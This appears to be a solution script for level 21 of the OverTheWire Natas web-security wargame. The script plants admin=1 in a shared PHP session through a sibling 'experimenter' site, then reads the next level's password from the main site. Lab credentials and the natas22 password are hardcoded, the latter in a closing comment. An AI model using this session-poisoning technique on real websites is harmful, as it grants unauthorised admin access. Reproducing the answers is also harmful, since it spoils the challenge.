from bs4 import BeautifulSoup
import requests
import re
def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())


url = 'http://natas21-experimenter.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas21','89OWrTkGmiLZLv12JY4tLj2c4FW0xn56')
my_cookies = {"PHPSESSID":'iingj5ruhsj7k4b80kh7s35m30'}
my_params = {"submit":"true","admin":"1","debug":"true"}

res, soup = make()


url = 'http://natas21.natas.labs.overthewire.org'

res, soup = make()
print(re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:])

writeResponse()



'''
easy as pie

Username: natas22
Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
'''
